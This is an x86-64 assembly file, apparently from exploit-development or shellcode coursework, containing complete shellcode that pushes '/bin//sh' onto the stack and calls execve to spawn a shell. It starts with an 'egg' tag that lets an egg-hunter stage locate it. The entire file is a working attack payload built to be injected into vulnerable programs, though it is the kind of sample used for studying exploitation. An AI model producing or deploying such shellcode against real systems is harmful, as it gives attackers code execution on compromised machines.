;open a shell with "egg"
;author: Javier Tejedor
;date: 09/09/2014


global _start 

section .text

_start:

	dd 0x50905091
	; First NULL push

	xor rax, rax
	push rax

	; push /bin//sh in reverse 

	mov rbx, 0x68732f2f6e69622f
	push rbx

	; store /bin//sh address in RDI

	mov rdi, rsp

	; Second NULL push 
	push rax

	; set RDX
	mov rdx, rsp 


	; Push address of /bin//sh
	push rdi

	; set RSI

	mov rsi, rsp

	; Call the Execve syscall 
	add rax, 59
	syscall
